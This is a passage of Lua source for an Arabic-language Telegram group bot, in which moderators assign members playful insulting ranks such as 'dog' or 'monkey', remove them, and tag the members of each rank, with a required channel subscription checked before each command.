send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ القميـل >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
local  statuss  = '\n *⊀︰ تمَ رفعَهہ↫ مميز*'
texts = usertext..statuss
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^ارفع مميز (%d+)$") and Mod(msg) then
local userid = text:match("^ارفع مميز (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
database:sadd(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ القميـل >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n *⊀︰ تمَ رفعَهہ↫ مميز*'
send(msg.chat_id_, msg.id_, usertext..statuss)
else
usertext = '\n *⊀︰ القميـل >* '..userid..''
local  statuss  = '\n *⊀︰ تمَ رفعَهہ↫ مميز*'
send(msg.chat_id_, msg.id_, usertext..statuss)
end;end,nil)
return false
end

if (text == ("نزل مميز")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ القميـل >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المميزين*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^نزل مميز @(.*)$") and Mod(msg) then
local username = text:match("^نزل مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n *⊀︰ القميـل >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المميزين*'
texts = usertext..status
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^نزل مميز (%d+)$") and Mod(msg) then
local userid = text:match("^نزل مميز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ القميـل >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم نزله من المميزين*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ القميـل >* '..userid..''
status  = '\n *⊀︰ تم نزله من المميزين*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
------------------------------------------------------------------------
if text == 'نزل المطايه' and Mod(msg) then
database:del(bot_id..'Mote:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم مسح جميع المطايه')
end
if text == ("تاك للمطايه") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة مطايه الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> المطي [@"..username.."]\n"
else
t = t..""..k.."> المطي `"..v.."`\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد مطايه"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع تمبلر") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ بـࢪو >* ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ⊀︰ تم رفـع الـضلـ؏ُ تـمبلر\n ⊀︰ بلـعافيه صـࢪت مثـقـف..🛹'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل كانسغ")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ بـࢪو >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم تنـزيل الـضلـ؏ُ كـانسـغ\n ⊀︰ بلـعافيه صـࢪت مـعـيدي..🥢'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل الحاتات' and Mod(msg) then
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم مسح جميع الحاتات')
end
if text == ("تاك للحاتات") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n ⊀︰ قائمه حاتات الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الحاته [@"..username.."]\n"
else
t = t..""..k.."> الحاته `"..v.."`\n"
end
end
if #list == 0 then
t = " ⊀︰ مع الاسف لا يوجد حاته"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع الحاته") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⊀︰ العضــو > ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ⊀︰ تم ارفع العضــو الحاته في الكروب \n ⊀︰ تعال يحاته ممكن نتعرف'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل الحاته")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⊀︰ العضــو > ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل العضــو الحاته من الكروب\n ⊀︰ مشيي مو خوش حاتهه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل الصاكين' and Mod(msg) then
database:del(bot_id..'Modde:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم مسح جميع الصاكين')
end
if text == ("تاك للصاكين") and Mod(msg) then
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n ⊀︰ قائمه صاكين الكروب \nٴ●━━━━𝐑𝐀━━━━●ٴ\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الصاك [@"..username.."]\n"
else
t = t..""..k.."> الصاك `"..v.."`\n"
end
end
if #list == 0 then
t = " ⊀︰ مع الاسف لا يوجد صاكين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع الصاك") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⊀︰ العضــو > ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n ⊀︰ تم ارفع العضــو الصاك في الكروب \n ⊀︰ تعال حبي الصاك نطيني بوسه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل الصاك")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⊀︰ العضــو > ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل العضــو الصاك من الكروب\n ⊀︰ مشيي مو خوش صاك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل الصخوله' and Mod(msg) then
database:del(bot_id..'Sakl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع صخوله من الكروب')
end
if text == ("تاك للصخوله") and Mod(msg) then
local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة صخوله الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الصخل [@"..username.."]\n"
else
t = t..""..k.."> الصخل `"..v.."`\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد صخل"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع صخل") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع المتهم صخل بالكروب\n ⊀︰ الان اصبح صخل الكروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if (text == ("نزل صخل")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل ﭑݪعضوٍَ صخل\n ⊀︰ ارجع للبيتكم حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل الجلاب' and Mod(msg) then
database:del(bot_id..'Motte:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع جلاب الكروب')
end
if text == ("تاك للجلاب") and Mod(msg) then
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة الجلاب الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الجلب [@"..username.."]\n"
else
t = t..""..k.."> الجلب `"..v.."`\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد جلب"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع جلب") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع جلب في الكروب\n ⊀︰ تعال حبي اطيك عضمه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل جلب")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل جلب في الكروب\n ⊀︰ حبي رجع عضمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل القروده' and Mod(msg) then
database:del(bot_id..'Motee:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع القروده بالكروب')
end
if text == ("تاك للقروده") and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة القروده الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> القرد [@"..username.."]\n"
else
t = t..""..k.."> القرد `"..v.."`\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد قرد"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع قرد في الكروب\n ⊀︰ تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل قرد")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل قرد من الكروب\n ⊀︰ رجع موزه حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل الضلوع' and Mod(msg) then
database:del(bot_id..'Bro:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع الضلوع بالكروب')
end
if text == ("تاك للضلوع") and Mod(msg) then
local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة الضلوع الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الضلع [@"..username.."]\n"
else
t = t..""..k.."> الضلع `"..v.."`\n"
end
end
if #list == 0 then
t = " ⊀︰ لا يوجد ضلع"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("ارفع ضلع") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'* ⊀︰ تـم تعطيـل الࢪفـ؏..🕸️*') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
local  statuss  = '\n ⊀︰ تم ارفع ضلع في الكروب\n ⊀︰ تعال حبيبي انت صرت من الضلوع حظر روحك منا ورايح نطلع سفرات للجزيره والزوراء ونشرب عرك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("نزل ضلع")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n ⊀︰ تم نزل ضلع من الكروب\n ⊀︰ بعد لتراويني وجهك ياحقير وجيب فلوس الشرب'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'نزل الضلعات' and Mod(msg) then
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⊀︰ تم نزل جميع الضلعات بالكروب')
end
if text == ("تاك للضلعات") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n ⊀︰ قائمة الضلعات الكروب \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."> الضلعه [@"..username.."]\n"
else
